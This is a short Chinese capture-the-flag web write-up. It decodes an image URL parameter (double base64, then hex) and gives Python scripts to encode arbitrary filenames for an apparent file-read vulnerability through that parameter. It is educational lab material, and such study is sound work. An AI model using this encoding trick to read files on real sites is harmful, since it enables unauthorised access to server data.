解题步骤

打开题目直接F12

可以看到图片这里是base64编码，再看url中的img=TXpVek5UTTFNbVUzTURabE5qYz0，这一串看着也像base64编码，对它进行base64解码(这里我注意到这串字符串的长度为27,不符合base64特征，base64编码后的字符串长度应该是4的整数倍，所以添加一个‘=’后再进行解码)

推测解码过程base64.decode->base64.decode->hex,于是可以一个解码脚本

import base64
import binascii
c=base64.b64decode(base64.b64decode(input()))
print(binascii.a2b_hex(c))//将十六进制形式的二进制数据转化为ascii码

最后解出img参数为‘555.png’，由此猜测可以通过img传参进行任意文件读取，传递的参数要先经过上述解码的逆过程hex->base64.encode->base64.encode,写一个编码脚本

import binascii
import base64
filename = input().encode(encoding='utf-8')
hex = binascii.b2a_hex(filename)//将二进制数据转化为十六进制形式
base1 = base64.b64encode(hex)
base2 = base64.b64encode(base1)
print(base2.decode())
